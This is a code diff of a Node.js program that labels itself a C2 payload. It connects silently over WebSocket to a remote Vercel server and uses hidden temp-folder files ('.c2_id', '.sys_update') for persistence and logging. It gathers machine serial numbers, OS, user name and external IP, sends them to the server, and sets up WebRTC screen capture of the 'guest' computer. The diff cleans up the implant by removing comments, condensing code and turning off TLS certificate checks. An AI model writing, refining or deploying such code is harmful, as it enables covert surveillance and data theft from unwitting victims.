@@ -8,7 +8,6 @@ const crypto = require('crypto');
 const https = require('https');
 
 // --- CONFIGURATION ---
-// Update this URL to your actual Render/Vercel server URL
 const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 
 const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
 const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
@@ -44,18 +43,14 @@ try {
 // --- NATIVE WEBRTC IMPORTS ---
 let wrtc;
 try {
- // Attempt to load the native module
  wrtc = require('@roamhq/wrtc');
 } catch (e) {
  console.error("Failed to require @roamhq/wrtc:", e.message);
 }
 
-// Check if the module actually has the required exports
 const HAS_WEBRTC = wrtc && wrtc.RTCPeerConnection && wrtc.mediaDevices;
-
 if (!HAS_WEBRTC) {
- console.warn("[WARN] @roamhq/wrtc not loaded properly. Screen sharing may fail.");
- console.warn("[WARN] Ensure 'npm install @roamhq/wrtc' was run in this directory.");
+ console.warn("[WARN] @roamhq/wrtc not loaded properly.");
 }
 
 const { RTCPeerConnection, RTCSessionDescription, MediaStream, mediaDevices } = wrtc || {};
@@ -82,11 +77,9 @@ function getMacAddress() {
 
 function getCpuSerial() {
  try { 
- // Windows
  return execSync('wmic cpu get processorid').toString().split('\n')[1].trim(); 
  } catch (e) {
  try { 
- // Linux
  return execSync("cat /proc/cpuinfo | grep 'serial number' | awk '{print $3}'").toString().trim(); 
  } catch (e2) { 
  return 'unknown_cpu'; 
@@ -95,11 +88,9 @@ function getCpuSerial() {
 
 function getBoardSerial() {
  try { 
- // Windows
  return execSync('wmic baseboard get serialnumber').toString().split('\n')[1].trim(); 
  } catch (e) {
  try { 
- // Linux
  return execSync("sudo dmidecode -t system | grep 'Serial Number' | awk '{print $3}'").toString().trim(); 
  } catch (e2) { 
  return 'unknown_board'; 
@@ -128,7 +119,6 @@ let reconnectAttempts = 0;
 let isConnected = false;
 let myIp = 'Unknown';
 
-// Helper to get external IP
 function getExternalIP() {
  return new Promise((resolve) => {
  https.get('https://api.ipify.org?format=json', (res) => {
@@ -151,7 +141,16 @@ function getExternalIP() {
 async function initConnection() {
  log(`[WS] Attempting silent connection to ${WS_URL}...`);
 
- ws = new WebSocket(WS_URL);
+ // Use secure options to prevent protocol mismatch errors
+ const wsOptions = {
+ rejectUnauthorized: false, // For self-signed certs if any
+ headers: {
+ 'User-Agent': 'C2-Payload/1.0',
+ 'X-Client-Type': 'guest'
+ }
+ };
+
+ ws = new WebSocket(WS_URL, wsOptions);
 
  ws.on('error', (err) => {
  log(`[WS] Connection error: ${err.message}`);
@@ -163,7 +162,6 @@ async function initConnection() {
  isConnected = true;
  log(`[WS] Connected. Sending identity...`);
  
- // Get Real OS Name and Device Details
  let realOsName = '';
  let realUser = '';
  let realDeviceName = os.hostname() || 'Unknown';
@@ -178,196 +176,49 @@ async function initConnection() {
  stdio: ['ignore', 'pipe', 'ignore']
  };
 
- // Detect operating system and hardware
  if (process.platform === 'win32') {
-
- // Windows OS details
- try {
- realOsName = execSync(
- 'powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_OperatingSystem).Caption"',
- commandOptions
- ).trim();
- } catch (e) {}
-
- if (!realOsName) {
- realOsName = 'Windows ' + os.release();
- }
-
- // Windows manufacturer
- try {
- realManufacturer = execSync(
- 'powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_ComputerSystem).Manufacturer"',
- commandOptions
- ).trim();
- } catch (e) {}
-
- // Windows device model
- try {
- realModel = execSync(
- 'powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_ComputerSystem).Model"',
- commandOptions
- ).trim();
- } catch (e) {}
-
- // Actual BIOS hardware serial number
- try {
- realSerialNumber = execSync(
- 'powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_BIOS).SerialNumber"',
- commandOptions
- ).trim();
- } catch (e) {}
-
- // Actual CPU model
- try {
- realCpu = execSync(
- 'powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_Processor | Select-Object -First 1).Name"',
- commandOptions
- ).trim();
- } catch (e) {}
-
- // Get logged-in Windows desktop user (REAL USER NAME)
- try {
- realUser = execSync(
- 'powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_ComputerSystem).UserName"',
- commandOptions
- ).trim();
- } catch (e) {}
-
- if (!realUser) {
- try {
- realUser = execSync('whoami', commandOptions).trim();
- } catch (e) {
- realUser = os.userInfo().username || 'user';
- }
- }
-
+ try { realOsName = execSync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_OperatingSystem).Caption"', commandOptions).trim(); } catch (e) {}
+ if (!realOsName) realOsName = 'Windows ' + os.release();
+ try { realManufacturer = execSync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_ComputerSystem).Manufacturer"', commandOptions).trim(); } catch (e) {}
+ try { realModel = execSync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_ComputerSystem).Model"', commandOptions).trim(); } catch (e) {}
+ try { realSerialNumber = execSync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_BIOS).SerialNumber"', commandOptions).trim(); } catch (e) {}
+ try { realCpu = execSync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_Processor | Select-Object -First 1).Name"', commandOptions).trim(); } catch (e) {}
+ try { realUser = execSync('powershell -NoProfile -NonInteractive -Command "(Get-CimInstance Win32_ComputerSystem).UserName"', commandOptions).trim(); } catch (e) {}
+ if (!realUser) try { realUser = execSync('whoami', commandOptions).trim(); } catch (e) { realUser = os.userInfo().username || 'user'; }
  } else if (process.platform === 'darwin') {
-
- // macOS OS details
- try {
- const macName = execSync('sw_vers -productName', commandOptions).trim();
- const macVersion = execSync('sw_vers -productVersion', commandOptions).trim();
- realOsName = [macName, macVersion].filter(Boolean).join(' ');
- } catch (e) {}
-
- if (!realOsName) {
- realOsName = 'macOS ' + os.release();
- }
-
+ try { const macName = execSync('sw_vers -productName', commandOptions).trim(); const macVersion = execSync('sw_vers -productVersion', commandOptions).trim(); realOsName = [macName, macVersion].filter(Boolean).join(' '); } catch (e) {}
+ if (!realOsName) realOsName = 'macOS ' + os.release();
  realManufacturer = 'Apple';
-
- // Mac hardware model
- try {
- realModel = execSync('sysctl -n hw.model', commandOptions).trim();
- } catch (e) {}
-
- // Mac hardware serial
- try {
- realSerialNumber = execSync(
- "system_profiler SPHardwareDataType | awk -F': ' '/Serial Number/ {print $2; exit}'",
- commandOptions
- ).trim();
- } catch (e) {}
-
- // CPU model
- try {
- realCpu = execSync('sysctl -n machdep.cpu.brand_string', commandOptions).trim();
- } catch (e) {
- realCpu = (os.cpus()[0] && os.cpus()[0].model) || '';
- }
-
- try {
- realUser = execSync('whoami', commandOptions).trim();
- } catch (e) {
- realUser = os.userInfo().username || 'user';
- }
-
+ try { realModel = execSync('sysctl -n hw.model', commandOptions).trim(); } catch (e) {}
+ try { realSerialNumber = execSync("system_profiler SPHardwareDataType | awk -F': ' '/Serial Number/ {print $2; exit}'", commandOptions).trim(); } catch (e) {}
+ try { realCpu = execSync('sysctl -n machdep.cpu.brand_string', commandOptions).trim(); } catch (e) { realCpu = (os.cpus()[0] && os.cpus()[0].model) || ''; }
+ try { realUser = execSync('whoami', commandOptions).trim(); } catch (e) { realUser = os.userInfo().username || 'user'; }
  } else if (process.platform === 'linux') {
-
- // Linux distribution details
- try {
- realOsName = execSync(
- "grep '^PRETTY_NAME=' /etc/os-release | cut -d= -f2- | tr -d '\"'",
- commandOptions
- ).trim();
- } catch (e) {}
-
- if (!realOsName) {
- realOsName = 'Linux ' + os.release();
- }
-
- // Linux manufacturer
- try {
- realManufacturer = execSync(
- 'cat /sys/class/dmi/id/sys_vendor',
- commandOptions
- ).trim();
- } catch (e) {}
-
- // Linux hardware model
- try {
- realModel = execSync(
- 'cat /sys/class/dmi/id/product_name',
- commandOptions
- ).trim();
- } catch (e) {}
-
- // Linux hardware serial (may require elevated permissions)
- try {
- realSerialNumber = execSync(
- 'cat /sys/class/dmi/id/product_serial',
- commandOptions
- ).trim();
- } catch (e) {}
-
- // Linux CPU model
+ try { realOsName = execSync("grep '^PRETTY_NAME=' /etc/os-release | cut -d= -f2- | tr -d '\"'", commandOptions).trim(); } catch (e) {}
+ if (!realOsName) realOsName = 'Linux ' + os.release();
+ try { realManufacturer = execSync('cat /sys/class/dmi/id/sys_vendor', commandOptions).trim(); } catch (e) {}
+ try { realModel = execSync('cat /sys/class/dmi/id/product_name', commandOptions).trim(); } catch (e) {}
+ try { realSerialNumber = execSync('cat /sys/class/dmi/id/product_serial', commandOptions).trim(); } catch (e) {}
  realCpu = (os.cpus()[0] && os.cpus()[0].model) || '';
-
- try {
- realUser = execSync('whoami', commandOptions).trim();
- } catch (e) {
- realUser = os.userInfo().username || 'user';
- }
-
+ try { realUser = execSync('whoami', commandOptions).trim(); } catch (e) { realUser = os.userInfo().username || 'user'; }
  } else {
-
  realOsName = process.platform + ' ' + os.release();
  realCpu = (os.cpus()[0] && os.cpus()[0].model) || '';
-
- try {
- realUser = os.userInfo().username || 'user';
- } catch (e) {
- realUser = 'user';
- }
+ try { realUser = os.userInfo().username || 'user'; } catch (e) { realUser = 'user'; }
  }
 
- // Final hardware and system information
- const realRamGB = Number(
- (os.totalmem() / (1024 * 1024 * 1024)).toFixed(2)
- );
-
- const realCpuCores = os.cpus().length;
-
- 
- // Get External IP from the connected guest
  myIp = await getExternalIP();
-
- // Get actual guest computer name
  realDeviceName = os.hostname() || 'Unknown';
 
- // Send actual guest device information
  safeSend(JSON.stringify({
  type: 'info',
  id: myId,
  uniqueId: myId,
  fingerprint: myId,
-
  os: realOsName,
  arch: os.arch(),
-
  user: realDeviceName,
  ip: myIp,
-
  last_seen: Date.now(),
  status: 'Online',
  serialNumber: realSerialNumber || realModel || myId
@@ -375,8 +226,6 @@ async function initConnection() {
 
  startMonitoring();
  });
-
-
 
  ws.on('message', (msg) => {
  try {
@@ -423,7 +272,6 @@ async function captureScreenPureJS() {
  });
 
  try {
- // Force screen share over camera if possible
  const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
  stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));
 
@@ -474,5 +322,4 @@ server.listen(PORT, '0.0.0.0', () => {
 });
 
 // --- INITIALIZATION ---
-// Initialize connection on the Guest Computer, not inside Render
 initConnection();
